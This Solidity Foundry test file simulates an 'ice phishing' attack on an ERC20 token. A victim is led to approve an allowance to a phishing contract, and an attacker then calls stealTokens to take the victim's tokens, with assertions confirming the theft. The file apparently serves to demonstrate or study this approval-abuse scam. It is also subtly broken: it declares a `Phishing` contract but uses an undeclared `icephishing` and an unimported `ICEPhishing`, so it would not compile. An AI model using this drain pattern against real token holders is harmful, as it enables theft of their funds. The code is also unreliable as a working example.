// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {Phishing} from "../src/Phishing.sol";
import {ERC20Token} from "../src/ERC20.sol";

contract PhishingTest is Test {
    Phishing public phishing;
    ERC20Token public token;
    address public tokenDeployer;
    address public victim;
    address public attacker;

    function setUp() public {
        // Set victim and attacker addresses
        victim = address(0x1);
        tokenDeployer = address(0x2);
        attacker = address(this);

        vm.startPrank(tokenDeployer);
        // Deploy ERC20 token contract
        token = new ERC20Token(1000000);
        // Allocate some tokens to the victim
        token.transfer(victim, 1000 * 10 ** uint256(token.decimals()));

        vm.stopPrank();

        // Deploy ICEPhishing contract
        icephishing = new ICEPhishing(address(token));
    }

    function testApproveForReward() public {
        console.log("Victim address:", victim);
        console.log("ICEPhishing contract address:", address(icephishing));

        vm.startPrank(victim);
        bool success = token.approve(address(icephishing), 500 * 10 ** uint256(token.decimals()));
        require(success, "Approval failed");

        // Verify that the allowance was successfully set
        uint256 allowance = token.allowance(victim, address(icephishing));
        console.log("Allowance after approval:", allowance);
        assertEq(allowance, 500 * 10 ** uint256(token.decimals()));
        vm.stopPrank();
    }

    function testStealTokens() public {
        uint256 amount = 500 * 10 ** uint256(token.decimals());

        // First, ensure victim grants allowance
        vm.startPrank(victim);
        bool approvalSuccess = token.approve(address(icephishing), amount);
        require(approvalSuccess, "Approval failed");

        // Check that the allowance is set correctly
        uint256 allowance = token.allowance(victim, address(icephishing));
        assertEq(allowance, amount);
        vm.stopPrank();

        vm.startPrank(attacker);
        // Attacker calls stealTokens to transfer tokens from victim to attacker
        icephishing.stealTokens(victim, amount);
        vm.stopPrank();

        // Check balances after the attack
        uint256 victimBalance = token.balanceOf(victim);
        uint256 attackerBalance = token.balanceOf(attacker);

        console.log("Victim balance after attack:", victimBalance);
        console.log("Attacker balance after attack:", attackerBalance);

        // Expect victim’s balance to decrease by 500 * 10^6 and attacker’s to increase by 500 * 10^6
        assertEq(victimBalance, 1000 * 10 ** uint256(token.decimals()) - amount);
        assertEq(attackerBalance, amount);
    }
}
